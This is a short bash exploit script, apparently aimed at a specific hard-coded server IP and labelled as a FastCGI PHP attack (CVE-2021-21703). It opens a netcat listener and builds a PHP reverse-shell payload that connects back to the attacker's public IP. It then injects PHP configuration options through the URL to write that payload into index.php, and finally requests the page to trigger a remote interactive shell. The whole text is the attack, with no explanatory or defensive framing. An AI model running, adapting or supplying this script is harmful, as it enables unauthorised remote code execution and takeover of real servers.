#!/bin/bash
TARGET_IP="14.225.209.143"
IP=$(curl -s ifconfig.me)
PORT=4444

echo "[+] FastCGI CVE-2021-21703 → ${IP}:${PORT}"

# 1. LISTENER
nc -lvnp $PORT &
sleep 1

# 2. FASTCGI PAYLOAD (metodo corretto)
cat > payload.php << EOF
<?php
\$sock=fsockopen("$IP",$PORT);
\$proc=proc_open("/bin/bash -i <&3 >&3 2>&3",array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"),3=>$sock),\$pipes);
EOF

# 3. BASE64 + EXPLOIT
PAYLOAD_B64=$(base64 -w0 payload.php)
curl -k -s \
  "https://${TARGET_IP}:443/?-d+auto_prepend_file=php://filter/write=convert.base64-decode/resource=index.php+-d+allow_url_include=1" \
  --data-urlencode "$PAYLOAD_B64" & 

sleep 2
curl -k "https://${TARGET_IP}:443/index.php"
